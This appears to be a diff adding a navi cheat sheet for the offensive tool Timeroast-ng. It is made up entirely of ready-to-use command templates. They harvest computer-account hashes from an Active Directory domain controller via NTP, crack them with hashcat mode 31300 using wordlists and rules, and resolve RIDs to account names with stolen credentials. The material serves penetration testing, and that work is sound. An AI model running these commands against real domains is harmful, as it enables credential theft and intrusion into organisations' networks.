@@ -1,0 +1,39 @@
+% Timeroast-ng
+# Cheat sheet with example commands that can be incorporated in your navi
+# collection.
+
+# Timeroast: default scan (T5, blocking, SLOW)
+timeroast-ng.py <dc_ip> -r <ranges>
+
+# Timeroast: default scan (T5, non-blocking, FAST)
+timeroast-ng.py <dc_ip> -r <ranges> -T5 -non-blocking
+
+# Timeroast: FAST non-blocking scan to output file (T5)
+timeroast-ng.py <dc_ip> -r <ranges> -T5 -non-blocking -outfile <outfile>
+
+# Timeroast: FAST non-blocking scan to output file (T5, no RIDs)
+timeroast-ng.py <dc_ip> -r <ranges> -T5 -non-blocking -outfile <outfile> -no-userid
+
+# Timeroast: FAST non-blocking scan to output file (T5, append)
+timeroast-ng.py <dc_ip> -r <ranges> -T5 -non-blocking -outfile <outfile> -append
+
+# Timeroast: FAST non-blocking scan with old passwords (T5)
+timeroast-ng.py <dc_ip> -r <ranges> -T5 -non-blocking -use-oldkey
+
+# Timeroast: FAST non-blocking scan with old passwords to output file (T5)
+timeroast-ng.py <dc_ip> -r <ranges> -T5 -non-blocking -use-oldkey -outfile <outfile>
+
+# hashcat: crack Timeroast hashes with usernames (dictionary attack)
+hashcat -a 0 -m 31300 --username <hashes> <wordlist>
+
+# hashcat: crack Timeroast hashes (dictionary attack)
+hashcat -a 0 -m 31300 <hashes> <wordlist>
+
+# hashcat: crack Timeroast hashes with usernames and rules (dictionary attack)
+hashcat -a 0 -m 31300 -r <rules> --username <hashes> <wordlist>
+
+# hashcat: crack Timeroast hashes (dictionary attack)
+hashcat -a 0 -m 31300 -r <rules> <hashes> <wordlist>
+
+# resolveRID: get computer account name for RID (authenticated user)
+resolveRID.py '<domain>'/'<user>':'<password>'@<dc_ip> <rid>
